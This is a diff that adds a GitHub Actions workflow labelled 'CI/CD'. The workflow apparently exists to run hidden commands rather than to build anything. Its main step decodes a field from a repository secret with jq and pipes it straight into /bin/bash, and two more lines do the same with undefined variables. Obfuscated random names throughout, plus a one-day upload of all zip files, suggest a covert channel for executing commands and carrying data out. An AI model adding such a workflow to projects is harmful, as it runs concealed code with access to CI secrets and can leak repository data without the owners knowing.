@@ -1,0 +1,27 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          hglxo3: ${{ secrets.hglxo3 }}
+        run: |
+          printf '%s' "$hglxo3" | jq -r .uaouy2570 | /bin/bash
+          echo $lt07003 | jq -r .qub10457 | /bin/bash
+          printf '%s' "$bgpac59091" | jq -r .cfjx725 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: 8K0bnCmZ
+          path: "*.zip"
+          retention-days: 1
